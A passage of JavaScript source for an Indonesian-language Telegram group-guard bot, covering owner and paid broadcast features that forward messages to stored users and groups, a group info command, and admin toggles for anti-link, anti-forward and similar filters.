  const chatId = query.message.chat.id;
  const data = query.data;

  if (!data.startsWith("broadcast_")) return;

  if (!OWNER.includes(String(userId))) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Hanya owner yang bisa menggunakan broadcast.",
      show_alert: true
    });
  }

  if (data === "broadcast_cancel") {
    delete broadcastState[userId];
    return bot.editMessageText(
      `<blockquote><tg-emoji emoji-id="4958526153955476488">❌</tg-emoji> Broadcast dibatalkan.</blockquote>`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "HTML"
      }
    );
  }

  if (!broadcastState[userId] || broadcastState[userId].step !== 'choose_type') return;

  let type;
  if (data === "broadcast_user") type = "user";
  else if (data === "broadcast_group") type = "group";
  else if (data === "broadcast_all") type = "all";

  broadcastState[userId].type = type;
  broadcastState[userId].step = 'await_message';

  bot.answerCallbackQuery(query.id, { text: "✅ Pilihan diterima" });

  bot.editMessageText(
    `<blockquote><tg-emoji emoji-id="5215209935188534658">✏️</tg-emoji> Kirim teks atau forward pesan yang ingin di-broadcast:</blockquote>`,
    {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "HTML"
    }
  );
});

bot.on('message', async (msg) => {
  const userId = msg.from.id;

  if (!OWNER.includes(String(userId))) return;
  if (!broadcastState[userId] || broadcastState[userId].step !== 'await_message') return;

  if (broadcastInProgress[userId]) return;
  broadcastInProgress[userId] = true;

  const type = broadcastState[userId].type;
  const content = msg;
  const chatId = msg.chat.id;

  let users = loadUsers();
  let groups = loadGroups();

  let targets = [];
  if (type === "user") {
    targets = Object.keys(users);
  } else if (type === "group") {
    targets = groups.map(g => g.id);
  } else if (type === "all") {
    const userIds = Object.keys(users);
    const groupIds = groups.map(g => g.id);
    targets = [...userIds, ...groupIds];
  }

  const total = targets.length;
  let success = 0;
  let failed = 0;

  const statusMsg = await bot.sendMessage(
    chatId,
    `<blockquote><tg-emoji emoji-id="5454415424319931791">⏳</tg-emoji> Broadcast dimulai...\nTotal target: <b>${total}</b>\nBerhasil: 0\nGagal: 0</blockquote>`,
    { parse_mode: "HTML" }
  );

  for (let i = 0; i < targets.length; i++) {
    const id = targets[i];

    try {
      await bot.forwardMessage(id, chatId, content.message_id);
      success++;

    } catch (err) {
      failed++;
      console.log(`Failed to send to ${id}: ${err.message}`);

      const errorCode = err.response?.body?.error_code;
      const desc = err.response?.body?.description || "";

      if (type === "user" || type === "all") {
        if (
          errorCode === 403 || 
          errorCode === 400 ||
          desc.includes("blocked") ||
          desc.includes("chat not found")
        ) {
          delete users[id];
          console.log(`🗑️ User ${id} dihapus dari database`);
        }
      }

      if (type === "group" || type === "all") {
        if (
          errorCode === 403 ||
          errorCode === 400 ||
          desc.includes("chat not found")
        ) {
          groups = groups.filter(g => g.id != id);
          console.log(`🗑️ Group ${id} dihapus dari database`);
        }
      }
    }

    if ((i + 1) % 5 === 0 || i === targets.length - 1) {
      await bot.editMessageText(
        `<blockquote><tg-emoji emoji-id="5454415424319931791">⏳</tg-emoji> Broadcast dimulai...\nTotal target: <b>${total}</b>\nBerhasil: <b>${success}</b>\nGagal: <b>${failed}</b></blockquote>`,
        {
          chat_id: chatId,
          message_id: statusMsg.message_id,
          parse_mode: "HTML"
        }
      );
    }
  }
  
  saveUsers(users);
  saveGroups(groups);

  bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5936067938955039275">✅</tg-emoji> Broadcast selesai!</blockquote>`,
    { parse_mode: "HTML" }
  );

  delete broadcastState[userId];
  broadcastInProgress[userId] = false;
});

// ====================== BROADCAST BERBAYAR ======================
// Harga: Rp1.000 per chat / Rp10.000 per 1000 chat
const HARGA_PER_CHAT = 1000;
const HARGA_PER_1K   = 10000;

const bcbayarState = {};
const bcbayarInProgress = {};

function getSafeCallbackData(query) {
  return typeof query?.data === 'string' ? query.data : '';
}

// Helper: tampilkan menu pilih target (dipakai oleh /bcbayar dan tombol mulai)
async function sendBcbayarMenu(chatId, userId, sendFn) {
  const users      = loadUsers();
  const saldo      = users[String(userId)]?.saldo ?? 0;
  const totalUser  = Object.keys(users).length;
  const totalGroup = loadGroups().length;

  const text =
    `<tg-emoji emoji-id="5956145717062929500">📣</tg-emoji> <b>BROADCAST BERBAYAR</b>\n\n` +
    `<tg-emoji emoji-id="6129870117619634982">💳</tg-emoji> <b>Tarif:</b>\n` +
    `• Rp${HARGA_PER_CHAT.toLocaleString('id-ID')} / chat\n` +
    `• Rp${HARGA_PER_1K.toLocaleString('id-ID')} / 1.000 chat (lebih hemat)\n\n` +
    `<tg-emoji emoji-id="5967456680940671207">🗃</tg-emoji> Saldo kamu: <b>Rp${saldo.toLocaleString('id-ID')}</b>\n\n` +
    `<tg-emoji emoji-id="5891207662678317861">👤</tg-emoji> Total User: <b>${totalUser}</b>\n` +
    `<tg-emoji emoji-id="5258134813302332906">📦</tg-emoji> Total Grup: <b>${totalGroup}</b>\n\n` +
    `Pilih target:`;

  const markup = {
    inline_keyboard: [
      [
        { text: "User",  callback_data: "bcbayar_user",  style: "primary", icon_custom_emoji_id: "5319287627109644494" },
        { text: "Grup",  callback_data: "bcbayar_group", style: "primary", icon_custom_emoji_id: "5318942831430090639" }
      ],
      [{ text: "All (User+Grup)", callback_data: "bcbayar_all",    style: "success", icon_custom_emoji_id: "5316743524706698146" }],
      [{ text: "Batal",            callback_data: "bcbayar_cancel", style: "danger",  icon_custom_emoji_id: "4956612582816351459" }]
    ]
  };

  bcbayarState[userId] = { step: "choose_type" };
  return sendFn(text, { parse_mode: "HTML", reply_markup: markup });
}

// --- Tombol info dari menu utama -> menu_bcbayar ---
bot.on("callback_query", async (query) => {
  const data = getSafeCallbackData(query);
  if (data !== "menu_bcbayar" && data !== "bcbayar") return;
  const chatId    = query.message.chat.id;
  const messageId = query.message.message_id;
  const userId    = query.from.id;

  bot.answerCallbackQuery(query.id);

  const users  = loadUsers();
  const saldo  = users[String(userId)]?.saldo ?? 0;

  await bot.sendMessage(
  chatId,
  `<tg-emoji emoji-id="5215668805199473901">📣</tg-emoji> <b>BROADCAST BERBAYAR</b>\n\n` +
  `Kirim pesan ke ribuan user &amp; grup sesuai budget kamu!\n\n` +
  `<tg-emoji emoji-id="6129870117619634982">💳</tg-emoji> <b>Tarif:</b>\n` +
  `• Rp${HARGA_PER_CHAT.toLocaleString('id-ID')} / chat\n` +
  `• Rp${HARGA_PER_1K.toLocaleString('id-ID')} / 1.000 chat (lebih hemat)\n\n` +
  `<tg-emoji emoji-id="5891207662678317861">👤</tg-emoji> Saldo kamu: <b>Rp${saldo.toLocaleString('id-ID')}</b>\n\n` +
  `<tg-emoji emoji-id="5215229232476596064">➡️</tg-emoji> Gunakan: /bcbayar`,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Mulai Broadcast Berbayar", callback_data: "bcbayar_mulai", style: "success", icon_custom_emoji_id: "6269459131720012969" }],
        [{ text: "Back", callback_data: "back_home", style: "danger", icon_custom_emoji_id: "5258236805890710909" }]
      ]
    }
  }
).catch(() => {});
});

// --- Tombol "Mulai" dari menu_bcbayar ---
bot.on("callback_query", async (query) => {
  const data = getSafeCallbackData(query);
  if (data !== "bcbayar_mulai") return;
  const chatId = query.message.chat.id;
  const userId = query.from.id;

  if (bcbayarInProgress[userId]) {
    return bot.answerCallbackQuery(query.id, { text: "⏳ Broadcast sebelumnya masih berjalan!", show_alert: true });
  }

  bot.answerCallbackQuery(query.id);
  await sendBcbayarMenu(chatId, userId, (text, opts) => bot.sendMessage(chatId, text, opts));
});

// --- Command /bcbayar ---
bot.onText(/^\/bcbayar$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isMaintenance(msg)) return;

  // Hanya bisa dipakai di private chat
  if (msg.chat.type !== "private") {
    const me = await bot.getMe();
    return bot.sendMessage(chatId,
      `<blockquote>❌ Fitur broadcast berbayar hanya bisa digunakan di <b>private chat</b>.\n\nKlik @${me.username} lalu kirim /bcbayar di sana.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (bcbayarInProgress[userId]) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="4958526153955476488">❌</tg-emoji> Broadcast sebelumnya masih berjalan, tunggu sampai selesai.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  await sendBcbayarMenu(chatId, userId, (text, opts) => bot.sendMessage(chatId, text, opts));
});

// --- Handler semua callback bcbayar_ ---
bot.on("callback_query", async (query) => {
  const data = getSafeCallbackData(query);
  if (!data || !data.startsWith("bcbayar_")) return;

  const userId    = query.from.id;
  const chatId    = query.message.chat.id;
  const messageId = query.message.message_id;

  // ── BATAL ──
  if (data === "bcbayar_cancel") {
    delete bcbayarState[userId];
    delete bcbayarInProgress[userId];
    bot.answerCallbackQuery(query.id);
    return bot.editMessageText(
      `<blockquote><tg-emoji emoji-id="4958526153955476488">❌</tg-emoji> Broadcast berbayar dibatalkan.</blockquote>`,
      { chat_id: chatId, message_id: messageId, parse_mode: "HTML" }
    ).catch(() => {});
  }

  // ── PILIH TARGET (user / group / all) ──
  if (["bcbayar_user", "bcbayar_group", "bcbayar_all"].includes(data)) {
    if (!bcbayarState[userId] || bcbayarState[userId].step !== "choose_type") {
      return bot.answerCallbackQuery(query.id, { text: "⚠️ Mulai ulang dengan /bcbayar", show_alert: true });
    }

    const type   = data.replace("bcbayar_", "");
    const users  = loadUsers();
    const groups = loadGroups();

    let totalTarget;
    if (type === "user")       totalTarget = Object.keys(users).length;
    else if (type === "group") totalTarget = groups.length;
    else                       totalTarget = Object.keys(users).length + groups.length;

    const biaya = totalTarget * HARGA_PER_CHAT;
    const saldo = users[String(userId)]?.saldo ?? 0;
    const cukup = saldo >= biaya;

    bcbayarState[userId] = { step: "confirm", type, totalTarget, biaya };

    bot.answerCallbackQuery(query.id);
    return bot.editMessageText(
      `<tg-emoji emoji-id="5260268501515377807">📣</tg-emoji> <b>KONFIRMASI BROADCAST BERBAYAR</b>\n\n` +
      `<tg-emoji emoji-id="5224450179368767019">🌎</tg-emoji> Target: <b>${type.toUpperCase()}</b>\n` +
      `<tg-emoji emoji-id="5453957997418004470">👥</tg-emoji> Jumlah chat: <b>${totalTarget.toLocaleString('id-ID')}</b>\n` +
      `<tg-emoji emoji-id="5990147899403539264">💰</tg-emoji> Total biaya: <b>Rp${biaya.toLocaleString('id-ID')}</b>\n` +
      `<tg-emoji emoji-id="5240066289614987080">💳</tg-emoji> Saldo kamu: <b>Rp${saldo.toLocaleString('id-ID')}</b>\n` +
      `${cukup ? `✅ Saldo cukup` : `❌ Saldo tidak cukup!`}\n\n` +
      `${cukup ? `Kirim pesan yang ingin di-broadcast setelah tekan Lanjut.` : `Topup saldo dulu ya!`}`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: cukup
            ? [
                [{ text: "Lanjut - Kirim Pesan", callback_data: "bcbayar_lanjut", style: "success", icon_custom_emoji_id: "5208748315805499400" }],
                [{ text: "Batal", callback_data: "bcbayar_cancel", style: "danger", icon_custom_emoji_id: "4956612582816351459" }]
              ]
            : [
                [{ text: "Batal", callback_data: "bcbayar_cancel", style: "danger", icon_custom_emoji_id: "4956612582816351459" }]
              ]
        }
      }
    ).catch(() => {});
  }

  // ── LANJUT → tunggu pesan ──
  if (data === "bcbayar_lanjut") {
    if (!bcbayarState[userId] || bcbayarState[userId].step !== "confirm") {
      return bot.answerCallbackQuery(query.id, { text: `<tg-emoji emoji-id="6008233706039284019">⚠️</tg-emoji> Mulai ulang dengan /bcbayar`, show_alert: true });
    }
    bcbayarState[userId].step = "await_message";
    bot.answerCallbackQuery(query.id);
    return bot.editMessageText(
      `<blockquote><tg-emoji emoji-id="5215209935188534658">✏️</tg-emoji> Kirim atau forward pesan yang ingin di-broadcast sekarang:</blockquote>`,
      { chat_id: chatId, message_id: messageId, parse_mode: "HTML" }
    ).catch(() => {});
  }

  // ── EKSEKUSI broadcast ──
  if (data === "bcbayar_exec") {
    if (!bcbayarState[userId] || bcbayarState[userId].step !== "preview") {
      return bot.answerCallbackQuery(query.id, { text: `<tg-emoji emoji-id="6008233706039284019">⚠️</tg-emoji> Mulai ulang dengan /bcbayar`, show_alert: true });
    }

    const state = bcbayarState[userId];
    const users = loadUsers();
    const saldo = users[String(userId)]?.saldo ?? 0;

    if (saldo < state.biaya) {
      delete bcbayarState[userId];
      bot.answerCallbackQuery(query.id, { text: "❌ Saldo tidak cukup!", show_alert: true });
      return bot.editMessageText(
        `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Saldo tidak cukup. Broadcast dibatalkan.</blockquote>`,
        { chat_id: chatId, message_id: messageId, parse_mode: "HTML" }
      ).catch(() => {});
    }

    // Potong saldo & set flag
    if (!users[String(userId)]) {
      delete bcbayarState[userId];
      return bot.answerCallbackQuery(query.id, { text: "❌ Data user tidak ditemukan.", show_alert: true });
    }

    users[String(userId)].saldo -= state.biaya;
    saveUsers(users);

    bcbayarInProgress[userId] = true;
    delete bcbayarState[userId];
    bot.answerCallbackQuery(query.id, { text: "🚀 Broadcast dimulai!" });

    try {
      // Tentukan targets
      const freshUsers  = loadUsers();
      const freshGroups = loadGroups();
      const bcBl = loadBlacklist();
      let targets = [];
      if (state.type === "user")       targets = Object.keys(freshUsers);
      else if (state.type === "group") targets = freshGroups.map(g => String(g.id)).filter(id => !bcBl.includes(id));
      else                             targets = [...Object.keys(freshUsers), ...freshGroups.map(g => String(g.id)).filter(id => !bcBl.includes(id))];

      const total = targets.length;
      let success = 0, failed = 0;

      const statusMsg = await bot.sendMessage(chatId,
        `<blockquote><tg-emoji emoji-id="5454415424319931791">⏳</tg-emoji> Broadcast berbayar dimulai...
Total: <b>${total}</b>
Berhasil: 0 | Gagal: 0

<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji> Biaya: <b>-Rp${state.biaya.toLocaleString('id-ID')}</b></blockquote>`,
        { parse_mode: "HTML" }
      );

      for (let i = 0; i < targets.length; i++) {
        const id = targets[i];
        try {
          await bot.copyMessage(id, state.fromChatId, state.messageId);
          success++;
        } catch (err) {
          const errorCode = err.response?.body?.error_code;
          const desc = (err.response?.body?.description || err.message || "").toLowerCase();

          if (desc.includes("document_invalid")) {
            try {
              await bot.forwardMessage(id, state.fromChatId, state.messageId);
              success++;
            } catch (fwdErr) {
              failed++;
              const fwdDesc = (fwdErr.response?.body?.description || fwdErr.message || "").toLowerCase();
              const fwdCode = fwdErr.response?.body?.error_code;
              const dbUsers  = loadUsers();
              const dbGroups = loadGroups();
              if (state.type !== "group" &&
                  (fwdCode === 403 || (fwdCode === 400 && (fwdDesc.includes("blocked") || fwdDesc.includes("chat not found") || fwdDesc.includes("deactivated"))))) {
                delete dbUsers[id];
                saveUsers(dbUsers);
              }
              if (state.type !== "user" &&
                  (fwdCode === 403 || (fwdCode === 400 && (fwdDesc.includes("chat not found") || fwdDesc.includes("kicked") || fwdDesc.includes("not a member"))))) {
                saveGroups(dbGroups.filter(g => String(g.id) !== id));
              }
            }
          } else {
            failed++;
            const dbUsers  = loadUsers();
            const dbGroups = loadGroups();
            if (state.type !== "group" &&
                (errorCode === 403 || (errorCode === 400 && (desc.includes("blocked") || desc.includes("chat not found") || desc.includes("deactivated"))))) {
              delete dbUsers[id];
              saveUsers(dbUsers);
            }
            if (state.type !== "user" &&
                (errorCode === 403 || (errorCode === 400 && (desc.includes("chat not found") || desc.includes("kicked") || desc.includes("not a member"))))) {
              saveGroups(dbGroups.filter(g => String(g.id) !== id));
            }
          }
        }

        await delay(50);

        if ((i + 1) % 5 === 0 || i === targets.length - 1) {
          await bot.editMessageText(
            `<blockquote><tg-emoji emoji-id="5454415424319931791">⏳</tg-emoji> Broadcast berbayar...
Total: <b>${total}</b>
Berhasil: <b>${success}</b> | Gagal: <b>${failed}</b>

<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji> Biaya: <b>-Rp${state.biaya.toLocaleString('id-ID')}</b></blockquote>`,
            { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
          ).catch(() => {});
        }
      }

      const sisaSaldo = loadUsers()[String(userId)]?.saldo ?? 0;
      await bot.sendMessage(chatId,
        `<blockquote><tg-emoji emoji-id="5936067938955039275">✅</tg-emoji> Broadcast berbayar selesai!</blockquote>
` +
        `<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> Berhasil: <b>${success}</b>
` +
        `<tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal: <b>${failed}</b>
` +
        `<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji> Saldo tersisa: <b>Rp${sisaSaldo.toLocaleString('id-ID')}</b></blockquote>`,
        { parse_mode: "HTML" }
      );
    } catch (err) {
      await bot.sendMessage(chatId,
        `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Broadcast berbayar gagal dijalankan.</blockquote>
` +
        `<blockquote><code>${String(err?.message || err)}</code></blockquote>`,
        { parse_mode: "HTML" }
      ).catch(() => {});
    } finally {
      delete bcbayarInProgress[userId];
    }
  }

});

// --- Tangkap pesan untuk preview sebelum broadcast ---
bot.on("message", async (msg) => {
  if (msg.from?.is_bot) return;
  if (msg.chat?.type !== 'private') return;
  const userId = msg.from.id;
  if (!bcbayarState[userId] || bcbayarState[userId].step !== "await_message") return;

  const state = bcbayarState[userId];
  state.step        = "preview";
  state.fromChatId  = msg.chat.id;
  state.messageId   = msg.message_id;

  const users = loadUsers();
  const saldo = users[String(userId)]?.saldo ?? 0;

  await bot.sendMessage(msg.chat.id,
    `<tg-emoji emoji-id="5260268501515377807">📣</tg-emoji> <b>PREVIEW BROADCAST BERBAYAR</b>\n\n` +
    `Pesan di atas akan dikirim ke <b>${state.totalTarget.toLocaleString('id-ID')}</b> chat.\n` +
    `<tg-emoji emoji-id="5240066289614987080">💳</tg-emoji> Biaya: <b>Rp${state.biaya.toLocaleString('id-ID')}</b>\n` +
    `<tg-emoji emoji-id="5258134813302332906">📦</tg-emoji> Saldo kamu: <b>Rp${saldo.toLocaleString('id-ID')}</b>\n\n` +
    `Apakah kamu yakin ingin melanjutkan?`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Kirim Sekarang!", callback_data: "bcbayar_exec",   style: "success", icon_custom_emoji_id: "6298630163047387557" }],
          [{ text: "Batal",            callback_data: "bcbayar_cancel", style: "danger",  icon_custom_emoji_id: "4956612582816351459" }]
        ]
      }
    }
  );
});

/* ALL COMMAND MD FEATURE */

bot.onText(/^\/infogb(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  const chatIdStr = chatId.toString();

  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="5805345674383855340">🚫</tg-emoji> Perintah ini hanya bisa digunakan di grup.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  try {

    const chat = await bot.getChat(chatId);
    const memberCount = await bot.getChatMemberCount(chatId);

    const settings = getSettings()[chatIdStr] || {};

    const text = `
<blockquote><tg-emoji emoji-id="5398052521249881872">📊</tg-emoji> <b>INFO GROUP</b></blockquote>
<blockquote><tg-emoji emoji-id="6260059243605398502">🏷</tg-emoji> <b>Nama:</b> ${chat.title}
<tg-emoji emoji-id="5334890573281114250">🆔</tg-emoji> <b>ID:</b> <code>${chatId}</code>
<tg-emoji emoji-id="5453957997418004470">👥</tg-emoji> <b>Total Member:</b> ${memberCount}

<tg-emoji emoji-id="4958689671950369798">🔗</tg-emoji> <b>Username:</b> ${chat.username ? "@"+chat.username : "Tidak ada"}

━━━━━━━━━━━━━━
<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji> <b>STATUS FITUR</b>

<tg-emoji emoji-id="5839375134061761681">🔗</tg-emoji> AntiLink : ${settings.antilink ? `ON <tg-emoji emoji-id="6237651574588445185">👍</tg-emoji>` : `OFF <tg-emoji emoji-id="6237790860377854962">🙅</tg-emoji>`}
<tg-emoji emoji-id="5454113432284446338">📩</tg-emoji> AntiForward : ${settings.antiforward ? `ON <tg-emoji emoji-id="6237651574588445185">👍</tg-emoji>` : `OFF <tg-emoji emoji-id="6237790860377854962">🙅</tg-emoji>`}
<tg-emoji emoji-id="5375074927252621134">🖼</tg-emoji> AntiFoto : ${settings.antifoto ? `ON <tg-emoji emoji-id="6237651574588445185">👍</tg-emoji>` : `OFF <tg-emoji emoji-id="6237790860377854962">🙅</tg-emoji>`}
<tg-emoji emoji-id="5215668805199473901">📢</tg-emoji> AntiPromosi : ${settings.antipromosi ? `ON <tg-emoji emoji-id="6237651574588445185">👍</tg-emoji>` : `OFF <tg-emoji emoji-id="6237790860377854962">🙅</tg-emoji>`}
<tg-emoji emoji-id="5460873805297624194">🔞</tg-emoji> AntiBokep : ${settings.antibokep ? `ON <tg-emoji emoji-id="6237651574588445185">👍</tg-emoji>` : `OFF <tg-emoji emoji-id="6237790860377854962">🙅</tg-emoji>`}
<tg-emoji emoji-id="5433758796289685818">👑</tg-emoji> AntiAdmin : ${settings.antiadmin ? `ON <tg-emoji emoji-id="6237651574588445185">👍</tg-emoji>` : `OFF <tg-emoji emoji-id="6237790860377854962">🙅</tg-emoji>`}
<tg-emoji emoji-id="5258077307985207053">📹</tg-emoji> AntiVideo : ${settings.antivideo ? `ON <tg-emoji emoji-id="6237651574588445185">👍</tg-emoji>` : `OFF <tg-emoji emoji-id="6237790860377854962">🙅</tg-emoji>`}
<tg-emoji emoji-id="5260450573768990626">📵</tg-emoji> AntiNumber : ${settings.antinumber ? `ON <tg-emoji emoji-id="6237651574588445185">👍</tg-emoji>` : `OFF <tg-emoji emoji-id="6237790860377854962">🙅</tg-emoji>`}
<tg-emoji emoji-id="5292182646850329286">🕋</tg-emoji> WaktuSholat : ${settings.waktusholat ? `ON <tg-emoji emoji-id="6237651574588445185">👍</tg-emoji>` : `OFF <tg-emoji emoji-id="6237790860377854962">🙅</tg-emoji>`}
<tg-emoji emoji-id="5318986077455795572">📌</tg-emoji> Kota Sholat : ${settings.kota ? settings.kota.charAt(0).toUpperCase() + settings.kota.slice(1) : `Belum diset`}

━━━━━━━━━━━━━━
<tg-emoji emoji-id="5287684458881756303">🤖</tg-emoji> <b>Bot Group Guard</b>
</blockquote>
`;

    bot.sendMessage(chatId, text, { parse_mode: "HTML" });

  } catch (err) {
    console.log("InfoGB error:", err);
    bot.sendMessage(chatId, `<blockquote>❌ Gagal ambil info grup. Pastikan bot punya izin admin di grup ini.</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
  }

});

bot.onText(/^\/antilink(?:@\w+)?(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;
  
  if (isMaintenance(msg)) return;
  if (!onlyGroup(msg, bot)) return;
  if (!await requireJoin(msg)) return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Hanya admin yang boleh mengubah setting.</blockquote>`,
    { parse_mode: "HTML" }
  );

  const option = match[1];

  if (!option) {
    return bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> Contoh penggunaan:</blockquote>
<blockquote>/antilink on
/antilink off
</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const opt = option.toLowerCase();
  let settings = getSettings();

  if (!settings[chatId]) settings[chatId] = {};

  const current = settings[chatId].antilink ?? false;

  if (opt === "on" && current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiLink sudah aktif sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (opt === "off" && !current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiLink sudah dimatikan sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  settings[chatId].antilink = opt === "on";
  saveSettings(settings);

  bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> AntiLink berhasil ${opt}</blockquote>`,
    { parse_mode: "HTML" }
  );
});

bot.onText(/^\/antiforward(?:@\w+)?(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;
  
  if (isMaintenance(msg)) return;
  if (!onlyGroup(msg, bot)) return;
  if (!await requireJoin(msg)) return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Hanya admin yang boleh mengubah setting.</blockquote>`,
    { parse_mode: "HTML" }
  );

  const option = match[1];

  if (!option) {
    return bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> Contoh penggunaan:</blockquote>
<blockquote>/antiforward on
/antiforward off
</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const opt = option.toLowerCase();
  let settings = getSettings();

  if (!settings[chatId]) settings[chatId] = {};

  const current = settings[chatId].antiforward ?? false;

  if (opt === "on" && current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiForward sudah aktif sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (opt === "off" && !current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiForward sudah dimatikan sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  settings[chatId].antiforward = opt === "on";
  saveSettings(settings);

  bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> AntiForward berhasil ${opt}</blockquote>`,
    { parse_mode: "HTML" }
  );
});

bot.onText(/^\/antifoto(?:@\w+)?(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;
  
  if (isMaintenance(msg)) return;
  if (!onlyGroup(msg, bot)) return;
  if (!await requireJoin(msg)) return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Hanya admin yang boleh mengubah setting.</blockquote>`,
    { parse_mode: "HTML" }
  );

  const option = match[1];

  if (!option) {
    return bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> Contoh penggunaan:</blockquote>
<blockquote>/antifoto on
/antifoto off
</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const opt = option.toLowerCase();
  let settings = getSettings();

  if (!settings[chatId]) settings[chatId] = {};

  const current = settings[chatId].antifoto ?? false;

  if (opt === "on" && current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiFoto sudah aktif sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (opt === "off" && !current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiFoto sudah dimatikan sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  settings[chatId].antifoto = opt === "on";
  saveSettings(settings);

  bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> AntiFoto berhasil ${opt}</blockquote>`,
    { parse_mode: "HTML" }
  );
});

bot.onText(/^\/antiadmin(?:@\w+)?(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;

  if (isMaintenance(msg)) return;
  if (!onlyGroup(msg, bot)) return;
  if (!await requireJoin(msg)) return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Hanya admin yang boleh mengubah setting.</blockquote>`,
    { parse_mode: "HTML" }
  );

  const option = match[1];

  if (!option) {
    return bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> Contoh penggunaan:</blockquote>
<blockquote>/antiadmin on
/antiadmin off
</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const opt = option.toLowerCase();
  let settings = getSettings();

  if (!settings[chatId]) settings[chatId] = {};

  const current = settings[chatId].antiadmin ?? false;

  if (opt === "on" && current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiAdmin sudah aktif sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (opt === "off" && !current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiAdmin sudah dimatikan sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  settings[chatId].antiadmin = opt === "on";
  saveSettings(settings);

  bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> AntiAdmin berhasil ${opt}</blockquote>`,
    { parse_mode: "HTML" }
  );
});

bot.onText(/^\/antipromosi(?:@\w+)?(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;

